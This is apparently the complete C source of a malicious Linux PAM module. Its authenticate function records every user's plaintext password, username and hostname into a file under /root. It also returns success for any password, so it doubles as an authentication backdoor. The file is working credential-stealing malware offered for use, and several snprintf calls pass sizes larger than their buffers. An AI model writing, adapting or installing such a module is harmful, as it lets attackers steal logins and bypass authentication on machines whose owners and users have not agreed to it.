#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp) {
  return size * nmemb;
}

void saveFile(char (*message)[]) {
  char filePath[500];
  char data[200];

  snprintf(filePath, 600, "/root/passwd.txt"); // EDIT HERE YOUR FILE PATH
  snprintf(data, 300, "%s", *message);

  FILE *file = fopen(filePath, "a");
  fputs(data, file);
  fclose(file);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv ) { 
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv ) { 
  int retval;
  const char* username;
  const char* password;
  char message[1024];
  char hostname[128];
  retval = pam_get_user(pamh, &username, "Username: ");
  pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
  if (retval != PAM_SUCCESS)
    return retval;
  gethostname(hostname, sizeof hostname);
  snprintf(message, 2048, "Hostname: %s\nUsername: %s\nPassword: %s\n\n", hostname, username, password);
  saveFile(&message);
  return PAM_SUCCESS;
}

